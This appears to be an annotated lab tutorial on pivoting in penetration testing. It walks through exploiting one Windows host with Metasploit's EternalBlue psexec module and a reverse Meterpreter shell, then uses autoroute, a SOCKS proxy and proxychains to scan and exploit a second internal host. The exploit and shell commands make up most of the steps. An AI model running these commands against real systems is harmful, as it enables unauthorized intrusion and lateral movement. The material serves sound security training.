````markdown
# Pivoting and Routing Tables in Penetration Testing

This document explains pivoting between two target machines (`Target1` and `Target2`) using Kali Linux, Metasploit, and Proxychains.  
Each command is annotated with **what it does and why it’s needed** for better understanding.

---

## Description

### Pivoting
- **Pivoting** = using one compromised machine as a stepping stone to reach another machine in an otherwise inaccessible internal network.
- Example: You compromise `Target1` (on both external + internal networks) and then use it to reach `Target2` (internal only).

---

### SOCKS Proxy
- A **SOCKS proxy** forwards all types of traffic (TCP/UDP) through an intermediate host.  
- In pentesting:
  - It allows you to tunnel your traffic **through Target1 into Target2**.  
  - Your Kali machine behaves as if it were inside the internal network.  

---

### Proxychains
- **Proxychains** forces any application to send its traffic through a proxy (SOCKS, HTTP, etc.).  
- Why needed?
  - Without it, only **Metasploit modules** can use the pivot (via `autoroute`).  
  - With it, **any tool** (`nmap`, `sqlmap`, `msfconsole`) can access internal hosts.  

---

### Strict Chain vs Dynamic Chain
- **Strict Chain**: Proxychains must use proxies in the *exact order* listed in the config file.  
  - If one proxy fails, the whole chain fails.  
  - Useful if you want controlled routing.  
- **Dynamic Chain**: Proxychains will try proxies in order but *skip dead ones*.  
  - More flexible, commonly used in CTFs and real-world pentests.  
- That’s why we usually **uncomment `dynamic_chain`** and **comment `strict_chain`**.

---

## Network Configuration

- **Kali Linux (Attacker)**
  - BA: `192.168.0.139`

- **Windows 10 (Target1 - Compromised Pivot)**
  - BA: `192.168.0.117`
  - HA: `192.168.205.105`

- **Windows 10 Clone (Target2 - Internal)**
  - HA: `192.168.205.106`

---

## Step 1: Gaining Access to Target1

```bash
msfconsole
````

* Launches Metasploit console.

```bash
search ms17-010
```

* Searches for EternalBlue SMB exploit.

```bash
use exploit/windows/smb/ms17_010_psexec
```

* Loads the specific exploit module.

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

* Payload gives us a reverse Meterpreter shell from Target1 back to Kali.

```bash
set RHOST 192.168.0.117
set SMBUSER forensic
set SMBPASS admin
set LHOST 192.168.0.139
set LPORT 6622
```

* Configures exploit:

  * `RHOST`: victim IP (Target1 external).
  * `SMBUSER/SMBPASS`: valid credentials.
  * `LHOST/LPORT`: our Kali listener.

```bash
exploit
```

* Runs the exploit.
* If successful → Meterpreter session opened on Target1.

---

## Step 2: Adding Routing Table for Pivoting

```bash
use post/multi/manage/autoroute
```

* Loads the `autoroute` module, which adds routes inside Metasploit.

```bash
set SESSION 1
```

* Tells autoroute to use Meterpreter session `1` (our session on Target1).

```bash
run
```

* Adds a route to the internal network (`192.168.205.0/24`) through Target1.

```bash
route
```

* Displays active routes in Metasploit.
* **Important:** This routing only works *inside Metasploit*.

  * You can now run Metasploit modules against Target2.
  * But you **cannot use external tools like nmap** yet.

---

## Step 3: Enabling SOCKS Proxy in Metasploit

```bash
use auxiliary/server/socks_proxy
```

* Loads the SOCKS proxy server module.

```bash
run
```

* Starts a local SOCKS5 proxy listener on Kali (default `127.0.0.1:1080`).
* Any tool configured to use this proxy can now tunnel through Target1 → Target2.

```bash
jobs
```

* Lists background jobs.
* Confirms the SOCKS proxy is running.

**Why is this needed?**

* The routing table alone only works for Metasploit.
* SOCKS proxy allows us to forward **any tool’s traffic** into the pivot network.
* Combined with Proxychains → external tools (nmap, msfconsole, etc.) can reach Target2.

---

## Step 4: Configuring Proxychains

```bash
mousepad /etc/proxychains4.conf
```

* Opens config file.

Inside:

* Uncomment:

  ```text
  dynamic_chain
  ```

  → Use dynamic chain mode (skip dead proxies).

* Comment:

  ```text
  strict_chain
  ```

  → Avoid strict ordering.

* Add/Replace SOCKS proxy:

  ```text
  socks5 127.0.0.1 1080
  ```

  → Point to our Metasploit SOCKS5 proxy.

Save and exit.

---

## Step 5: Scanning and Exploiting Target2

```bash
proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
```

* Runs Nmap **through Proxychains**.
* The scan reaches Target2 via Target1.
* Without Proxychains, Kali cannot reach `192.168.205.106` directly.

```bash
proxychains msfconsole
```

* Launches Metasploit, but all traffic goes through Proxychains.
* This lets us exploit Target2 as if we were inside the internal network.

```bash
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 192.168.205.106
set SMBUSER forensic
set SMBPASS admin
set LPORT 6644
exploit
```

* Same EternalBlue exploit, but now targeting Target2.
* Exploit works because traffic is tunneled through Target1.

---

## Key Takeaways

* **Routing table alone**: Only works *inside Metasploit*. Limited.
* **SOCKS Proxy + Proxychains**: Extends pivoting to any tool.
* **Strict vs Dynamic chain**:

  * Strict = must use all proxies in order, less fault-tolerant.
  * Dynamic = skips dead ones, more flexible.
* **Workflow**:

  1. Compromise Target1.
  2. Add route (Metasploit-level pivoting).
  3. Start SOCKS proxy.
  4. Configure Proxychains.
  5. Scan/exploit Target2 using any tool.

